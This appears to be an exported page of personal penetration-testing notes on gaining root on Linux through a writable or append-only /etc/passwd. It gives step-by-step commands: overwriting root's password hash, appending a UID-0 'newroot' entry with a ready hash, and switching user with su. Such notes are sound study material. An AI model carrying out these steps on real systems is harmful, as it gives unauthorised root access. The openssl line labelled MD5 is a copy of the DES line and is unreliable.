<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>/etc/passwd</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>/etc/passwd</h1><br /><a
      href="tem_Security_(Windows_&_Linux)--Cryptography_and_Password_Cracking--Authentication--Linux--Where_are_stored_the_passwords_hashes_in_Linux.html">Where
      are stored the passwords hashes in Linux</a>: description of /etc/passwd and
    /etc/shadow<br /><br /><strong>/etc/passwd</strong><br />For backwards compatibility, if the second field of a user
    row in /etc/passwd contains a password hash, it takes precedent over the hash in /etc/shadow<br />• <strong><span
        style="color:#a020f0;">writable</span></strong> → enter a new password hash for the root user, and then use the
    su command to switch to the root user.<br /> 0) Check permissions<br />
    <div class="codebox">
      <div class="codebox">
        target@debian:~$&nbsp;ls&nbsp;-l&nbsp;/etc/passwd<br />target@debian:~$&nbsp;./lse.sh&nbsp;-l&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#linux&nbsp;smart&nbsp;enumeration&nbsp;tool
      </div>
    </div><br /> <a href=""><img src="images/1293-1.png" alt="images/1293-1.png" /></a><br /> <a href=""><img
        src="images/1293-2.png" alt="images/1293-2.png" /></a><br /> 1)generate an hash of a password we can use
    openssl. With <a
      href="hodology--System_Security_(Windows_&_Linux)--Cryptography_and_Password_Cracking--Authentication--Linux--Hashing_algorithms--DES_algorithm.html">DES</a>
    or <a
      href="hodology--System_Security_(Windows_&_Linux)--Cryptography_and_Password_Cracking--Authentication--Linux--Hashing_algorithms--MD5_algorithm.html">MD5</a>
    algorithms(In <span style="color:#ff0000;">red</span> the Salt)<br />
    <div class="codebox">
      <div class="codebox">
        target@debian:~$&nbsp;openssl&nbsp;passwd&nbsp;&quot;abc&quot;&nbsp;&nbsp;&nbsp;#hash&nbsp;with&nbsp;DES&nbsp;algorithm<br />target@debian:~$&nbsp;openssl&nbsp;passwd&nbsp;&quot;abc&quot;&nbsp;&nbsp;&nbsp;#hash&nbsp;with&nbsp;MD5&nbsp;algorithm
      </div>
    </div><br /> <a href=""><img src="images/1293-3.png" alt="images/1293-3.png" /></a><br /> 2) Edit the /etc/passwd
    file and enter the hash in the second field of the root user<br />
    <div class="codebox">
      <div class="codebox">
        target@debian:~$&nbsp;vim&nbsp;/etc/passwd<br />#&nbsp;i&nbsp;--&gt;&nbsp;insert<br />#Esc&nbsp;--&gt;&nbsp;esc&nbsp;from&nbsp;insert<br />#:w&nbsp;--&gt;&nbsp;write(save)<br />#:q&nbsp;--&gt;&nbsp;exit
      </div>
    </div><br /> <a href=""><img src="images/1293-4.png" alt="images/1293-4.png" /></a><br /> 3) access to the root
    user<br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;su</div>
    </div><br /> <a href=""><img src="images/1293-5.png" alt="images/1293-5.png" /></a><br />• <strong><span
        style="color:#ff8700;">appendable</span></strong> → create a new user but assign to it the root user ID (0).
    This works because Linux allows multiple entries for the same user ID, as long as the usernames are different<br />
    0) If <span style="color:#a020f0;">writable</span> + <span style="color:#ff8700;">append</span> permission, mean
    that we can <span style="text-decoration:underline;">only</span> <span style="color:#ff8700;">append</span> lines to
    the file <br />
    <div class="codebox">
      <div class="codebox">
        target@debian:~$&nbsp;ls&nbsp;-l&nbsp;/etc/passwd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#writable?<br />target@debian:~$&nbsp;lsattr&nbsp;/etc/passwd&nbsp;&nbsp;&nbsp;&nbsp;#appendable?
      </div>
    </div><br /> <a href=""><img src="images/1293-6.png" alt="images/1293-6.png" /></a><br /> <a href=""><img
        src="images/1293-7.png" alt="images/1293-7.png" /></a><br /> *To set and unset <span
      style="color:#ff8700;">append</span> mode to a file, root privileges are needed with the command
    &quot;chattr&quot;<br />
    <div class="codebox">
      <div class="codebox">
        targetRoot@debian:~$&nbsp;chattr&nbsp;+a&nbsp;/etc/passwd&nbsp;&nbsp;#set&nbsp;append<br />targetRoot@debian:~$&nbsp;chattr&nbsp;-a&nbsp;/etc/passwd&nbsp;&nbsp;#unset&nbsp;append
      </div>
    </div><br /> 1) append a new row to /etc/passwd to create an alternative root user <br />
    <div class="codebox">
      <div class="codebox">
        target@debian:~$&nbsp;echo&nbsp;&quot;newroot:LuFpseshVUYeU:0:0:root:/root:/bin/bash&quot;&nbsp;&gt;&gt;&nbsp;/etc/passwd
      </div>
    </div><br /> <a href=""><img src="images/1293-8.png" alt="images/1293-8.png" /></a><br /> 2) access to the newroot
    user<br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;su&nbsp;-&nbsp;<span
          style="color:#000000;font-weight:400">&lt;</span>newUserCreated<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /> <a href=""><img src="images/1293-9.png" alt="images/1293-9.png" /></a><br /><br />
  </div>
</body>

</html>